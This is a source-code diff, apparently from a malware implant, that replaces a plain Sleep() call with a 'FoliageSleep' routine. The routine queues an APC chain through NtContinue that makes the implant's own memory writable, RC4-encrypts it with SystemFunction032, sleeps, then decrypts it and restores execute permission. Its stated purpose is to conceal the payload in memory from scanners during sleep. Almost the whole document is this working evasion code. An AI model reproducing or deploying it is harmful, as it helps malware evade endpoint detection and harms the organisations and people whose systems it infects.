@@ -325,7 +325,7 @@ VOID MaskedSleep(DWORD dwMs) {
     }
     HeapUnlock(hHeap);
 
-    Sleep(dwMs);
+    FoliageSleep(dwMs);
 
     ZeroMemory(&he, sizeof(he));
     HeapLock(hHeap);
@@ -337,4 +337,154 @@ VOID MaskedSleep(DWORD dwMs) {
         }
     }
     HeapUnlock(hHeap);
+}
+
+// =============================================
+// 6. FOLIAGE SLEEP OBFUSCATION
+// Encrypts the entire implant image with RC4 (SystemFunction032) and delays
+// execution via an APC chain, so the payload is concealed in memory during
+// sleep. The obfuscation chain runs in a separate thread and terminates it.
+// =============================================
+
+typedef VOID (NTAPI* FOLIAGE_APC_ROUTINE)(PVOID, PVOID, PVOID);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTCREATEEVENT)(PHANDLE, ACCESS_MASK, PVOID, ULONG, BOOLEAN);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTGETCONTEXT)(HANDLE, PCONTEXT);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTWAIT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTSIGNALWAIT)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTQUEUEAPC)(HANDLE, FOLIAGE_APC_ROUTINE, PVOID, PVOID, PVOID);
+typedef NTSTATUS (NTAPI* FOLIAGE_NTALERTRESUME)(HANDLE, PULONG);
+
+typedef struct _FOLIAGE_API {
+    FOLIAGE_NTCREATEEVENT     NtCreateEvent;
+    FOLIAGE_NTCREATETHREADEX  NtCreateThreadEx;
+    FOLIAGE_NTGETCONTEXT      NtGetContextThread;
+    FOLIAGE_NTWAIT            NtWaitForSingleObject;
+    FOLIAGE_NTSIGNALWAIT      NtSignalAndWaitForSingleObject;
+    FOLIAGE_NTQUEUEAPC       NtQueueApcThread;
+    FOLIAGE_NTALERTRESUME     NtAlertResumeThread;
+    PVOID                     NtContinue;
+    PVOID                     NtTestAlert;
+    PVOID                     SystemFunction032;
+} FOLIAGE_API, *PFOLIAGE_API;
+
+static BOOL FoliageInitApi(PFOLIAGE_API pApi) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll)
+        return FALSE;
+
+    pApi->NtCreateEvent                = (FOLIAGE_NTCREATEEVENT)GetProcAddress(hNtdll, "NtCreateEvent");
+    pApi->NtCreateThreadEx             = (FOLIAGE_NTCREATETHREADEX)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    pApi->NtGetContextThread           = (FOLIAGE_NTGETCONTEXT)GetProcAddress(hNtdll, "NtGetContextThread");
+    pApi->NtWaitForSingleObject        = (FOLIAGE_NTWAIT)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    pApi->NtSignalAndWaitForSingleObject = (FOLIAGE_NTSIGNALWAIT)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
+    pApi->NtQueueApcThread             = (FOLIAGE_NTQUEUEAPC)GetProcAddress(hNtdll, "NtQueueApcThread");
+    pApi->NtAlertResumeThread          = (FOLIAGE_NTALERTRESUME)GetProcAddress(hNtdll, "NtAlertResumeThread");
+    pApi->NtContinue                   = GetProcAddress(hNtdll, "NtContinue");
+    pApi->NtTestAlert                  = GetProcAddress(hNtdll, "NtTestAlert");
+    pApi->SystemFunction032            = GetProcAddress(LoadLibraryA("Advapi32.dll"), "SystemFunction032");
+
+    return TRUE;
+}
+
+// FoliageSleep obfuscates the whole image, sleeps via an APC chain, then
+// deobfuscates. Falls back to plain Sleep() if the chain cannot be built.
+VOID FoliageSleep(DWORD dwMs) {
+    FOLIAGE_API api = { 0 };
+    if (!FoliageInitApi(&api)) {
+        Sleep(dwMs);
+        return;
+    }
+
+    NTSTATUS st          = 0;
+    STRING   Key         = { 0 };
+    STRING   Img         = { 0 };
+    BYTE     Rnd[16]     = { 0 };
+    CONTEXT  Ctx[7]      = { 0 };
+    CONTEXT  CtxInit     = { 0 };
+    HANDLE   EvntSync    = NULL;
+    HANDLE   Thread      = NULL;
+    ULONG    Protect     = 0;
+
+    BCryptGenRandom(NULL, Rnd, sizeof(Rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    PVOID ImageBase = GetModuleHandleA(NULL);
+    ULONG ImageSize = ((PIMAGE_NT_HEADERS)((UINT_PTR)ImageBase +
+        ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;
+
+    Key.Buffer = (PCHAR)Rnd;    Key.Length = sizeof(Rnd);
+    Img.Buffer = ImageBase;     Img.Length = ImageSize;
+
+    // Synchronization event (SynchronizationEvent = 1)
+    st = api.NtCreateEvent(&EvntSync, EVENT_ALL_ACCESS, NULL, 1, FALSE);
+    if (st < 0) goto _out;
+
+    // Suspended thread (CreateFlags = 1 = suspended)
+    st = api.NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
+                              NULL, NULL, 1, 0, 0x1000 * 20, 0x1000 * 20, NULL);
+    if (st < 0) goto _out;
+
+    CtxInit.ContextFlags = CONTEXT_FULL;
+    st = api.NtGetContextThread(Thread, &CtxInit);
+    if (st < 0) goto _out;
+
+    // Return address after each APC = NtTestAlert (executes the next queued APC).
+    *(PVOID*)CtxInit.Rsp = api.NtTestAlert;
+
+    for (int i = 0; i < 7; i++)
+        memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
+
+    // Ctx[0] — wait for the start signal
+    Ctx[0].Rip = (UINT_PTR)api.NtWaitForSingleObject;
+    Ctx[0].Rcx = (UINT_PTR)EvntSync;
+    Ctx[0].Rdx = FALSE;
+    Ctx[0].R8  = 0;
+
+    // Ctx[1] — make image writable
+    Ctx[1].Rip = (UINT_PTR)VirtualProtect;
+    Ctx[1].Rcx = (UINT_PTR)ImageBase;
+    Ctx[1].Rdx = ImageSize;
+    Ctx[1].R8  = PAGE_READWRITE;
+    Ctx[1].R9  = (UINT_PTR)&Protect;
+
+    // Ctx[2] — encrypt image (RC4)
+    Ctx[2].Rip = (UINT_PTR)api.SystemFunction032;
+    Ctx[2].Rcx = (UINT_PTR)&Img;
+    Ctx[2].Rdx = (UINT_PTR)&Key;
+
+    // Ctx[3] — delay (sleep)
+    Ctx[3].Rip = (UINT_PTR)WaitForSingleObjectEx;
+    Ctx[3].Rcx = (UINT_PTR)GetCurrentProcess();
+    Ctx[3].Rdx = dwMs;
+    Ctx[3].R8  = FALSE;
+
+    // Ctx[4] — decrypt image
+    Ctx[4].Rip = (UINT_PTR)api.SystemFunction032;
+    Ctx[4].Rcx = (UINT_PTR)&Img;
+    Ctx[4].Rdx = (UINT_PTR)&Key;
+
+    // Ctx[5] — make image executable again
+    Ctx[5].Rip = (UINT_PTR)VirtualProtect;
+    Ctx[5].Rcx = (UINT_PTR)ImageBase;
+    Ctx[5].Rdx = ImageSize;
+    Ctx[5].R8  = PAGE_EXECUTE_READ;
+    Ctx[5].R9  = (UINT_PTR)&Protect;
+
+    // Ctx[6] — exit the chain thread
+    Ctx[6].Rip = (UINT_PTR)ExitThread;
+    Ctx[6].Rcx = 0;
+
+    // Queue the APC chain (NtContinue executes each context).
+    for (int i = 0; i < 7; i++) {
+        st = api.NtQueueApcThread(Thread, (FOLIAGE_APC_ROUTINE)api.NtContinue, &Ctx[i], 0, 0);
+        if (st < 0) goto _out;
+    }
+
+    // Resume the thread and trigger the chain; wait for it to finish.
+    api.NtAlertResumeThread(Thread, NULL);
+    api.NtSignalAndWaitForSingleObject(EvntSync, Thread, TRUE, NULL);
+
+_out:
+    if (Thread)    CloseHandle(Thread);
+    if (EvntSync)  CloseHandle(EvntSync);
 }
